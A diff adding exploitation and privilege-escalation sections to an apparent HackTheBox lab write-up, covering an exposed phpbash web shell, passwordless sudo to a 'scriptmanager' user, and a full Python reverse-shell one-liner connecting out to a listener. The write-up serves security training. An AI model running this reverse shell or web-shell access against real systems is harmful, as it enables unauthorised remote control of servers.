@@ -37,10 +37,30 @@ With the nikto scan in mind a dirbuster scan was performed to brute-force web di
 
 ## 3.0 - EXPLOITATION
 
-#### **3.1 - [exploit]**
+#### **3.1 - Accessing the Web Shell**
+
+Exploitation was simple, by navigating to the /dev/phpbash.php web directory we could get web shell as the www-data user. From here we have full access to the web server. 
+
+![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/d0abe153-d486-49d6-87a5-b2e604702ba5)
 
 ## 4.0 - PRIVILEGE ESCALATION 
 
-#### **4.1 - [exploit]**
+#### **4.1 - sudo -l**
+
+As the www-data user when performing the sudo -l command we can see that commands can be run as the 'scriptmanager' user without the need for a password. 
+
+![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/9564681b-0d11-40ce-8122-5749605bd2a1)
+![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/34411839-1474-4a87-ab6e-11a972f1b889)
+
+#### **4.2 - reverse shell**
+
+Because we can run commands as scriptmanagr a reverse shell was created using python which allowed our first privilege escalation to the scriptmanager user itself. 
+
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.0",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+Catching the reverse shell and checking the user id we can see it was sucsessful:
+
+![image](https://github.com/Gladoodles/hackthebox_machines/assets/96867367/6ee34a27-8da2-4132-ba2b-9d16912b551c)
 
 ## 5.0 - POST-EXPLOITATION 
